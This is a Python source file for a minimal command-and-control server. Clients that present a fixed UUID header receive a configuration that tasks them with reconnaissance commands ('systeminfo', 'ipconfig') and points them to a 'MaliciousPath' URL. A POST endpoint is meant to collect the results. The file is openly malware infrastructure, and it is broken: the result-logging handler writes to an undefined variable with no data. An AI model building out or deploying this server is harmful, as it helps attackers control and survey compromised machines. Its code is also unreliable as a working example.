from http.server import BaseHTTPRequestHandler, HTTPServer
import time
import urllib.request
import os
import json

hostName = "localhost" #ip
hostPort = 80 #443

UUID = '5a968c26-b565-4b65-8445-9e87780cb8f9-01'
MaliciousPath = '/MaliciousPath'
Configuration = "{'Server': '"+hostName+"', 'Commands':['systeminfo','ipconfig'],'MaliciousURL': '"+hostName+MaliciousPath+"'}"

with open('configuration.json', 'w') as outfile:
    json.dump(Configuration, outfile)

class MyServer(BaseHTTPRequestHandler):
    def do_GET(self):
        if (self.headers.get('UUID') == UUID):
            #print('UUID is good')
            if self.path.endswith("/Configuration"):
                self.send_response(200)
                self.send_header('Content-Type', 'application/json')
                self.end_headers()
                print((Configuration))
                #with open('configuration.json') as data_file:
                #    data = json.load(data_file)
                self.wfile.write(Configuration.encode())
                #print(Configuration)
                print('Got Configuration request')
                #print('Returned:'+json.loads(Configuration))
                #self.wfile.write(json.dumps(Configuration))

                #self.wfile.write(output.encode(encoding='utf_8'))
                #print (output)
                return
    def do_POST(self):
        if (self.headers.get('UUID') == UUID):
            if self.path.endswith("/Commands"):
                file = open("commands.txt","a+")
                f.write()



myServer = HTTPServer((hostName, hostPort), MyServer)
print(time.asctime(), "Server Starts - %s:%s" % (hostName, hostPort))

try:
    myServer.serve_forever()
except KeyboardInterrupt:
    pass

myServer.server_close()
print(time.asctime(), "Server Stops - %s:%s" % (hostName, hostPort))
